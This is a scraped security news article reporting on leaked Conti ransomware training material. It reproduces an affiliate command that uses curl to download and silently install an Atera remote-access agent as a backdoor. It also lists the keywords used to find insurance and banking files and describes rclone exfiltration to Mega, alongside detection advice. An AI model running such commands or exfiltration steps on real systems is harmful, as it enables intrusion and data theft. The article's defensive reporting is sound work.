# Reference for threat actor for "Wizard Spider, Gold Blackburn"

**Title**: Conti ransomware prioritizes revenue and cyberinsurance data theft

**Source**: https://www.bleepingcomputer.com/news/security/conti-ransomware-prioritizes-revenue-and-cyberinsurance-data-theft/

## Content






















Conti ransomware prioritizes revenue and cyberinsurance data theft
































































































News



Featured
Latest







Microsoft: New critical Exchange bug exploited as zero-day





LockBit claims ransomware attack on Fulton County, Georgia





Trans-Northern Pipelines investigating ALPHV ransomware attack claims





Microsoft February 2024 Patch Tuesday fixes 2 zero-days, 73 flaws









Three critical application security flaws scanners can’t detect





Turla hackers backdoor NGOs with new TinyTurla-NG malware





New Qbot malware variant uses fake Adobe installer popup for evasion





Take an extra $5 off this ad-blocking DNS for Presidents' Day








Tutorials



Latest
Popular







How to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11





How to use the Windows Registry Editor





How to backup and restore the Windows Registry





How to open a Windows 11 Command Prompt as Administrator









How to start Windows in Safe Mode





How to remove a Trojan, Virus, Worm, or other Malware





How to show hidden files in Windows 7





How to see hidden files in Windows








Virus Removal Guides



Latest
Most Viewed
Ransomware







Remove the Theonlinesearch.com Search Redirect





Remove the Smartwebfinder.com Search Redirect





How to remove the PBlock+ adware browser extension





Remove the Toksearches.xyz Search Redirect









Remove Security Tool and SecurityTool (Uninstall Guide)





How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundo





How to remove Antivirus 2009 (Uninstall Instructions)





How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKiller









Locky Ransomware Information, Help Guide, and FAQ





CryptoLocker Ransomware Information Guide and FAQ





CryptorBit and HowDecrypt Information Guide and FAQ





CryptoDefense and How_Decrypt Ransomware Information Guide and FAQ








Downloads



Latest
Most Downloaded







Qualys BrowserCheck





STOPDecrypter





AuroraDecrypter





FilesLockerDecrypter









AdwCleaner





ComboFix





RKill





Junkware Removal Tool








Deals



Categories







eLearning





IT Certification Courses





Gear + Gadgets





Security








VPNs



Popular







Best VPNs





How to change IP address





Access the dark web safely





Best VPN for YouTube








Forums
More

Startup Database
Uninstall Database
Glossary
Chat on Discord
Send us a Tip!
Welcome Guide




























HomeNewsSecurityConti ransomware prioritizes revenue and cyberinsurance data theft







 















Conti ransomware prioritizes revenue and cyberinsurance data theft


By Lawrence Abrams




August 17, 2021
03:27 PM
0





Training material used by Conti ransomware affiliates was leaked online this month, allowing an inside look at how attackers abuse legitimate software and seek out cyber insurance policies.
Earlier this month, a disgruntled affiliate posted to a hacking forum the IP addresses for Cobalt Strike C2 servers used by the gang and a 113 MB archive containing training material for conducting ransomware attacks.

Forum post from disgruntled affiliate
Using this leaked training material, security researchers, network admins, and incident responders can better respond to attacks and quickly find common indicators of compromise (IOCs) used by the ransomware gang.
This is exactly the case with new research released by Advanced Intel's CEO Vitali Kremez that illustrates how actual Conti attacks utilized the leaked information.
Legitimate remote access software used as backdoors
An interesting tactic used by the ransomware gang is using the legitimate Atera remote access software as a backdoor for continued persistence.
When conducting an attack, ransomware operations commonly deploy Cobalt Strike beacons that the attackers can use to execute commands remotely and gain continued access to a network.
However, security software products have become more adept at detecting Cobalt strike beacons, leading to a loss of access for the threat actors.
To prevent this, Kremez states that the Conti gang is installing the legitimate Atera remote access software on compromised systems, which the security software won't detect.

Conti ransomware attack flowSource: Advanced Intel
Atera is a remote management service where you deploy agents to your endpoints so that you can manage them all from a single console. By deploying agents to all compromised devices on a network, the Conti threat actors will gain remote access to any device from a single platform.
Kremez states that they have seen the following command used by Conti affiliates to install Atera on a compromised device:

shell curl -o setup.msi "http://REDACTED.servicedesk.atera.com/GetAgent/Msi/?customerId=1&integratorLogin=REDACTED%40protonmail.com" && msiexec /i setup.msi /qn  IntegratorLogin=REDACTED@protonmail.com CompanyId=1	
"In most of the cases, the adversaries leveraged protonmail[.]com and outlook[.]com email accounts to register with Atera to receive an agent installation script and console access," explained Kremez in a blog post about Conti using Atera.
Kremez advises admins to use whitelisting tools to block or audit command-line tools such as 'curl' to detect malicious activity.
"Audit and/or block command-line interpreters by using whitelisting tools, like AppLocker or Software Restriction Policies with the focus on any suspicious “curl” command and unauthorized “.msi” installer scripts particularly those from C:\ProgramData and C:\Temp directory," advises Kremez.
Conti targets insurance, banking files
One of the leaked documents titled 'CobaltStrike MANUAL_V2 .docx' details the specific steps that an affiliate should use when conducting a Conti ransomware attack.
After the first stage of the attack, which is to breach the network, gather credentials, and gain control of the Windows domain, the threat actors tell their affiliates to start exfiltrating data from the compromised network.
This stage is essential for the attackers, as files are not only used to scare victims into paying a ransom, but stolen accounting and insurance policy documents are also used to generate the initial ransom amount and perform negotiations.
When first exfiltrating data from the victim's servers, the Conti ransomware gang will specifically look for documents related to the company's financials and whether they have a cybersecurity policy.
"search by keywords. need accounting reports. bank statements. for 20-21 years. all fresh. especially important, cyber insurance, security policy documents," reads the translated Conti training document.
In particular, the threat actors look for the following keywords as part of their first data exfiltration steps:

cyber
policy
insurance
endorsement
supplementary
underwriting
terms
bank
2020
2021
Statement
The ransomware gang tells the affiliates to "prepares datapack right away" and immediately upload the data to Mega, which they used as a hosting platform for the exfiltrated data.
Kremez said that the attackers use the legitimate 'rclone' program to upload the data directly to the Mega cloud storage service.
"Rclone config is created and an external location (MEGA in this case) for data synchronization (data cloning) is established. The needed network shares are assigned within the rclone.conf on the victim’s network and a command is executed," explains Kremez in a blog post.
Kremez states that you should focus on any rclone.exe command run from the C:\ProgramData and C:\Temp directories to detect data exfiltration attempts.

Related Articles:
New RustDoor macOS malware impersonates Visual Studio updateResearchers link 3AM ransomware to Conti, Royal cybercrime gangsLockBit claims ransomware attack on Fulton County, GeorgiaTrans-Northern Pipelines investigating ALPHV ransomware attack claimsRansomware attack forces 100 Romanian hospitals to go offline











Backdoor
Cobalt Strike
Conti
Data Exfiltration
Insurance
Ransomware
























Lawrence Abrams   
Lawrence Abrams is the owner and Editor in Chief of BleepingComputer.com. Lawrence's area of expertise includes Windows, malware removal, and computer forensics. Lawrence Abrams is a co-author of the Winternals Defragmentation, Recovery, and Administration Field Guide and the technical editor for Rootkits for Dummies.




 Previous Article 
Next Article 



Post a Comment Community Rules

You need to login in order to post a comment

Not a member yet? Register Now



You may also like:













Popular Stories






Hackers used new Windows Defender zero-day to drop DarkMe malware







Microsoft February 2024 Patch Tuesday fixes 2 zero-days, 73 flaws

































Follow us:









Main Sections

News
VPN Buyer Guides
Downloads
Virus Removal Guides
Tutorials
Startup Database
Uninstall Database
Glossary



Community

Forums
Forum Rules
Chat



Useful Resources

Welcome Guide
Sitemap



Company

About BleepingComputer
Contact Us
Send us a Tip!
Advertising
Write for BleepingComputer
Social & Feeds
Changelog








Terms of Use -  Privacy Policy - Ethics Statement - Affiliate Disclosure


Copyright @ 2003 - 2024  Bleeping Computer® LLC  - All Rights Reserved












Login


Username



Password





Remember Me



Sign in anonymously





 Sign in with Twitter

Not a member yet? Register Now
















  
Reporter

Help us understand the problem. What is going on with this comment?




Spam


Abusive or Harmful


Inappropriate content


Strong language


Other





Read our posting guidelinese to learn what content is prohibited.



Submitting...
SUBMIT











